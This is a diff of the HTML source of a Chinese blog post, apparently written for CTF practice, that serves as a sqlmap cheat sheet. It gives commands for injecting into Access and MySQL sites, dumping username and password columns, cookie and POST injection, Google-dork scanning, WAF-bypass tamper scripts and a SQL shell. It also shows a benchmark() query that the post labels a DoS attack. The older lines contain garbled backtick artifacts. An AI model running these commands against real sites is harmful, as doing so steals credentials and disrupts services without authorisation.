@@ -16,15 +16,15 @@
   <meta name="author" content="gaifagafin">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、SQLMAP用于Access数据库注入(1) 猜解是否能注入 11win&#96;&#96;:&#96; &#96;python sqlmap.py &#96;&#96;-&#96;&#96;u &#96;&#96;&quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;en&#x2F;CompHonorBig.asp?id&#x3D;7&quot;&#96;&#96;Linux &#96;&#96;:&#96; &#96;.lmap.py &#96;&#96;-&#96;&#96;u &#96;&#96;&quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;en&#x2F;CompHonorBig.as">
+    <meta name="description" content="一、SQLMAP用于Access数据库注入(1) 猜解是否能注入 12windows: python sqlmap.py -u &quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;en&#x2F;CompHonorBig.asp?id&#x3D;7&quot; Linux: python sqlmap.py -u &quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;en&#x2F;CompHonorBig.asp?id&#x3D;7&amp;quo">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQLmap使用">
 <meta property="og:url" content="https://gaifagafin.github.io/2023/10/29/SQLmap%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="gaifagafin&#39;s blog">
-<meta property="og:description" content="一、SQLMAP用于Access数据库注入(1) 猜解是否能注入 11win&#96;&#96;:&#96; &#96;python sqlmap.py &#96;&#96;-&#96;&#96;u &#96;&#96;&quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;en&#x2F;CompHonorBig.asp?id&#x3D;7&quot;&#96;&#96;Linux &#96;&#96;:&#96; &#96;.lmap.py &#96;&#96;-&#96;&#96;u &#96;&#96;&quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;en&#x2F;CompHonorBig.as">
+<meta property="og:description" content="一、SQLMAP用于Access数据库注入(1) 猜解是否能注入 12windows: python sqlmap.py -u &quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;en&#x2F;CompHonorBig.asp?id&#x3D;7&quot; Linux: python sqlmap.py -u &quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;en&#x2F;CompHonorBig.asp?id&#x3D;7&amp;quo">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-10-29T10:45:23.000Z">
-<meta property="article:modified_time" content="2023-10-29T10:47:08.116Z">
+<meta property="article:modified_time" content="2023-11-01T10:34:33.735Z">
 <meta property="article:author" content="gaifagafin">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -220,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.9k 字
+          9.3k 字
         
       </span>
     
@@ -231,7 +231,7 @@
         
         
         
-          83 分钟
+          78 分钟
         
       </span>
     
@@ -287,48 +287,48 @@
               <div class="markdown-body">
                 
                 <h2 id="一、SQLMAP用于Access数据库注入"><a href="#一、SQLMAP用于Access数据库注入" class="headerlink" title="一、SQLMAP用于Access数据库注入"></a>一、SQLMAP用于Access数据库注入</h2><p>(1) 猜解是否能注入</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>win``:` `python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span>``Linux ``:` `.lmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">windows: <span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <br>Linux: <span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>(2) 猜解表</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>win``:` `python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span>` `--tables``Linux``:` `.lmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span>` `--tables<br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">windows: python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="hljs-attr">--tables</span> <br>Linux: python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="hljs-attr">--tables</span><br></code></pre></td></tr></table></figure>
 
 <p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>win``:` `python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span>` `--columns -T admin``Linux``:` `.lmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span>` `--columns -T admin<br></code></pre></td></tr></table></figure>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">windo<span class="hljs-symbol">ws:</span> python sqlmap.py -u <span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> --<span class="hljs-built_in">columns</span> -<span class="hljs-built_in">T</span> admin <br>Lin<span class="hljs-symbol">ux:</span> python sqlmap.py -u <span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> --<span class="hljs-built_in">columns</span> -<span class="hljs-built_in">T</span> admin<br></code></pre></td></tr></table></figure>
 
 <p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>win``:` `python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span>` `--dump -T admin -C <span class="hljs-string">&quot;username,password&quot;</span>``Linux``:` `.lmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span>` `--dump -T admin -C``<span class="hljs-string">&quot;username,[url=]B[/url]password&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">windows: python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="hljs-attr">--dump</span> -T admin -C <span class="hljs-string">&quot;username,password&quot;</span> <br> Linux: python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="hljs-attr">--dump</span> -T <br> admin -C <span class="hljs-string">&quot;username,[url=]B[/url]password&quot;</span><br></code></pre></td></tr></table></figure>
 
 
 
 <h2 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h2><p>(1) cookie注入，猜解表</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>win ``:` `python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.org/jsj/shownews.asp&quot;</span>` `--cookie <span class="hljs-string">&quot;id=31&quot;</span> --table --level <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">windows:  python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.xxx.org/jsj/shownews.asp&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=31&quot;</span> <span class="hljs-attr">--table</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
 
 <p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>win ``:``python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.org/jsj/shownews.asp&quot;</span>` `--cookie <span class="hljs-string">&quot;id=31&quot;</span> --columns -T``admin ``--level <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">windows: python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.xxx.org/jsj/shownews.asp&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=31&quot;</span> <span class="hljs-attr">--columns</span> -T <br>admin <span class="hljs-attr">--level</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
 
 <p>(3) 猜解内容</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>win ``:``python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.org/jsj/shownews.asp&quot;</span>` `--cookie <span class="hljs-string">&quot;id=31&quot;</span> --dump -T``admin ``-``C ``<span class="hljs-string">&quot;username,password&quot;</span>` `--level <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">windows: python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.xxx.org/jsj/shownews.asp&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=31&quot;</span> <span class="hljs-attr">--dump</span> -T <br>admin -C  <span class="hljs-string">&quot;username,password&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
 
 
 
-<h2 id="三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell"><a href="#三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell"></a>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">1win<span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>python</span> sqlmap.py <span class="hljs-string">``</span>-<span class="hljs-string">``</span>u [<span class="hljs-string">``</span>url<span class="hljs-string">``</span>]http<span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>/<span class="hljs-string">``</span>/<span class="hljs-string">``</span></span><span class="hljs-number">192.1</span><span class="hljs-string">``</span><span class="hljs-number">68.1</span><span class="hljs-string">``</span><span class="hljs-number">59.1</span><span class="hljs-string">``</span>/<span class="hljs-string">``</span>news.php?<span class="hljs-string">``</span>id<span class="hljs-string">``</span>=<span class="hljs-string">``</span><span class="hljs-number">1</span><span class="hljs-string">``</span>[<span class="hljs-string">``</span>/<span class="hljs-string">``</span>url<span class="hljs-string">``</span>] <span class="hljs-string">``</span>--sql-shell<span class="hljs-string">``</span><span class="hljs-title class_">Linux</span><span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>sqlmap</span> <span class="hljs-string">``</span>-<span class="hljs-string">``</span>u [<span class="hljs-string">``</span>url<span class="hljs-string">``</span>]http<span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>/<span class="hljs-string">``</span>/<span class="hljs-string">``</span></span><span class="hljs-number">192.1</span><span class="hljs-string">``</span><span class="hljs-number">68.1</span><span class="hljs-string">``</span><span class="hljs-number">59.1</span><span class="hljs-string">``</span>/<span class="hljs-string">``</span>news.php?<span class="hljs-string">``</span>id<span class="hljs-string">``</span>=<span class="hljs-string">``</span><span class="hljs-number">1</span><span class="hljs-string">``</span>[<span class="hljs-string">``</span>/<span class="hljs-string">``</span>url<span class="hljs-string">``</span>] <span class="hljs-string">``</span>--sql-shell<br></code></pre></td></tr></table></figure>
+<h2 id="三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell"><a href="#三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell"></a>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows: python sqlmap.py -u [url]http://192.1 68.1 59.1/news.php?<span class="hljs-built_in">id</span>=1 [/url] --sql<br>-shell <br>Linux: sqlmap -u [url]http://192.1 68.1 59.1/news.php?<span class="hljs-built_in">id</span>=1 [/url] --sql-shell<br></code></pre></td></tr></table></figure>
 
 <p>(2) 输入执行语句完成DDOS攻击</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>select` `benchmark``(``<span class="hljs-number">99999999999</span>``,``<span class="hljs-number">0</span>``x``<span class="hljs-number">70726</span>``f``<span class="hljs-number">62616</span>``e``<span class="hljs-number">646</span>``f``<span class="hljs-number">70726</span>``f``<span class="hljs-number">62616</span>``e``<span class="hljs-number">646</span>``f``<span class="hljs-number">70726</span>``f``<span class="hljs-number">62616</span>``e``<span class="hljs-number">646</span>``f``)<br></code></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> benchmark (<span class="hljs-number">99999999999</span>,<span class="hljs-number">0</span>x70726f62616e646f70726f62616e646f70726f62616e646f)<br></code></pre></td></tr></table></figure>
 
 
 
 <h2 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h2><p>(1) 查找数据库</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/link.php?id=321&quot;</span>` `--dbs<br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.xxx.com/link.php?id=321&quot;</span> <span class="hljs-attr">--dbs</span><br></code></pre></td></tr></table></figure>
 
 <p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/link.php?id=321&quot;</span>` `-``D dataname ``--tables<br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.xxx.com/link.php?id=321&quot;</span> -D dataname <span class="hljs-attr">--tables</span><br></code></pre></td></tr></table></figure>
 
 <p>(3) 通过2中的表得出列名(假如表为table_name)</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/link.php?id=321&quot;</span>` `-``D dataname ``-``T table_name ``--columns<br></code></pre></td></tr></table></figure>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">python sqlmap.py -u <span class="hljs-string">&quot;http://www.xxx.com/link.php?id=321&quot;</span> -D dataname -<span class="hljs-built_in">T</span> table_name --<span class="hljs-built_in">columns</span><br></code></pre></td></tr></table></figure>
 
 <p>(4) 获取字段的值(假如扫描出id,user,password字段)</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://www.xxx.com/link.php?id=321&quot;</span>` `-``D dataname ``-``T table_name ``-``C``<span class="hljs-string">&quot;id,user,password&quot;</span>` `--dump<br></code></pre></td></tr></table></figure>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">python</span> <span class="hljs-variable">sqlmap</span><span class="hljs-operator">.</span><span class="hljs-variable">py</span> <span class="hljs-operator">-</span><span class="hljs-variable">u</span> <span class="hljs-string">&quot;http://www.xxx.com/link.php?id=321&quot;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-variable">dataname</span> <span class="hljs-operator">-</span><span class="hljs-variable">T</span> <span class="hljs-type">table_name</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-string">&quot;id,user,password&quot;</span> <span class="hljs-operator">--</span><span class="hljs-variable">dump</span><br></code></pre></td></tr></table></figure>
 
 
 
@@ -350,60 +350,60 @@
 <li><p>运行sqlmap并使用如下命令：</p>
 </li>
 </ol>
-<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span><span class="hljs-string">``</span>/<span class="hljs-string">``</span>sqlmap.py <span class="hljs-string">``</span>-<span class="hljs-string">``</span>r search<span class="hljs-string">``</span>-<span class="hljs-string">``</span>test.txt <span class="hljs-string">``</span>-<span class="hljs-string">``</span>p tfUPass<br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>./sqlmap<span class="hljs-selector-class">.py</span>  - r search - test<span class="hljs-selector-class">.txt</span>  - <span class="hljs-selector-tag">p</span> tfUPass<br></code></pre></td></tr></table></figure>
 
 <p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
 <p>注入点：<a target="_blank" rel="noopener" href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></p>
 <p>几种注入方式：.&#x2F;sqlmap.py -r search-test.txt -p tfUPass</p>
 <p>(2) 自动的搜索</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">1sqlmap <span class="hljs-string">``</span>-<span class="hljs-string">``</span>u [<span class="hljs-string">``</span>url<span class="hljs-string">``</span>]http<span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>/<span class="hljs-string">``</span>/<span class="hljs-string">``</span>testasp</span>.vulnweb.com<span class="hljs-string">``</span>/<span class="hljs-string">``</span><span class="hljs-title class_">Login</span>.asp[<span class="hljs-string">``</span>/<span class="hljs-string">``</span>url<span class="hljs-string">``</span>] <span class="hljs-string">``</span>--forms<br></code></pre></td></tr></table></figure>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u [url]<span class="hljs-link">http://testasp.vulnweb.com/Login.asp</span>[<span class="hljs-string">/url</span>] --forms<br></code></pre></td></tr></table></figure>
 
 <p>(3) 指定参数搜索</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">1sqlmap <span class="hljs-string">``</span>-<span class="hljs-string">``</span>u [<span class="hljs-string">``</span>url<span class="hljs-string">``</span>]http<span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>/<span class="hljs-string">``</span>/<span class="hljs-string">``</span>testasp</span>.vulnweb.com<span class="hljs-string">``</span>/<span class="hljs-string">``</span><span class="hljs-title class_">Login</span>.asp[<span class="hljs-string">``</span>/<span class="hljs-string">``</span>url<span class="hljs-string">``</span>] <span class="hljs-string">``</span>--data <span class="hljs-string">&quot;tfUName=321&amp;tfUPass=321&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u [url]<span class="hljs-link">http://testasp.vulnweb.com/Login.asp</span>[<span class="hljs-string">/url</span>] --data &quot;tfUName=321&amp;tfUPass=321&quot;<br></code></pre></td></tr></table></figure>
 
 
 
 <h2 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h2><p>inurl后面的语言是由自己定的</p>
 <p>注入过程中如果选y是注入，如果不是选n</p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-number">1</span>sqlmap ``-``g inurl``<span class="hljs-symbol">:``php?``id``</span>=<br></code></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">sqlmap -g inurl:php?<span class="hljs-built_in">id</span>=<br></code></pre></td></tr></table></figure>
 
 
 
 <h2 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h2><p>参数 –delay –safe-freq</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>python sqlmap<span class="hljs-selector-class">.py</span> ``<span class="hljs-attr">--dbs</span> -u <span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span> <span class="hljs-attr">--delay</span> <span class="hljs-number">1</span>``python sqlmap<span class="hljs-selector-class">.py</span> ``<span class="hljs-attr">--dbs</span> -u <span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span> <span class="hljs-attr">--safe-freq</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dbs</span> -u <span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span> <span class="hljs-attr">--delay</span> <span class="hljs-number">1</span> python sqlmap<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dbs</span> -u <span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span> <span class="hljs-attr">--safe-freq</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
 
 <p>参数</p>
 <h2 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h2><p>注入点:<a target="_blank" rel="noopener" href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">1sqlmap <span class="hljs-string">``</span>-<span class="hljs-string">``</span>u [<span class="hljs-string">``</span>url<span class="hljs-string">``</span>]http<span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>/<span class="hljs-string">``</span>/<span class="hljs-string">``</span></span><span class="hljs-number">192.1</span><span class="hljs-string">``</span><span class="hljs-number">68.1</span><span class="hljs-string">``</span><span class="hljs-number">59.1</span><span class="hljs-string">``</span>/<span class="hljs-string">``</span>news.php?<span class="hljs-string">``</span>id<span class="hljs-string">``</span>=<span class="hljs-string">``</span><span class="hljs-number">1</span><span class="hljs-string">``</span>[<span class="hljs-string">``</span>/<span class="hljs-string">``</span>url<span class="hljs-string">``</span>] <span class="hljs-string">``</span>-<span class="hljs-string">``</span>v <span class="hljs-string">``</span><span class="hljs-number">3</span><span class="hljs-string">` `</span>--dbs --batch --tamper <span class="hljs-string">&quot;space2morehash.py&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u [url]http:<span class="hljs-string">//192.1</span> 68.1 59.1/news.php?id=1 [<span class="hljs-string">/url</span>] -v 3 <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--tamper</span> <span class="hljs-string">&quot;space2morehash.py&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>
 <p>都是编码方式</p>
 <p>space2hash.py base64encode.py charencode.py</p>
-<h2 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">1sqlmap <span class="hljs-string">``</span>-<span class="hljs-string">``</span>u [<span class="hljs-string">``</span>url<span class="hljs-string">``</span>]http<span class="hljs-string">``</span><span class="hljs-symbol">:<span class="hljs-string">``</span>/<span class="hljs-string">``</span>/<span class="hljs-string">``</span></span><span class="hljs-number">192.1</span><span class="hljs-string">``</span><span class="hljs-number">68.1</span><span class="hljs-string">``</span><span class="hljs-number">59.1</span><span class="hljs-string">``</span>/<span class="hljs-string">``</span>news.php?<span class="hljs-string">``</span>id<span class="hljs-string">``</span>=<span class="hljs-string">``</span><span class="hljs-number">1</span><span class="hljs-string">``</span>[<span class="hljs-string">``</span>/<span class="hljs-string">``</span>url<span class="hljs-string">``</span>] <span class="hljs-string">``</span>--privileges<br></code></pre></td></tr></table></figure>
+<h2 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u [url]http://192.1 68.1 59.1/news.php? <span class="hljs-built_in">id</span>=1 [/url] --privileges<br></code></pre></td></tr></table></figure>
 
 
 
-<h2 id="十、SQLMAP伪静态注入-1-查找数据库"><a href="#十、SQLMAP伪静态注入-1-查找数据库" class="headerlink" title="十、SQLMAP伪静态注入(1) 查找数据库"></a>十、SQLMAP伪静态注入(1) 查找数据库</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span>` `--dbs<br></code></pre></td></tr></table></figure>
+<h2 id="十、SQLMAP伪静态注入-1-查找数据库"><a href="#十、SQLMAP伪静态注入-1-查找数据库" class="headerlink" title="十、SQLMAP伪静态注入(1) 查找数据库"></a>十、SQLMAP伪静态注入(1) 查找数据库</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span> <span class="hljs-attr">--dbs</span><br></code></pre></td></tr></table></figure>
 
 <p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>python sqlmap.py ``-``u ``<span class="hljs-string">&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;</span>` `-``D dataname ``--tables<br></code></pre></td></tr></table></figure>
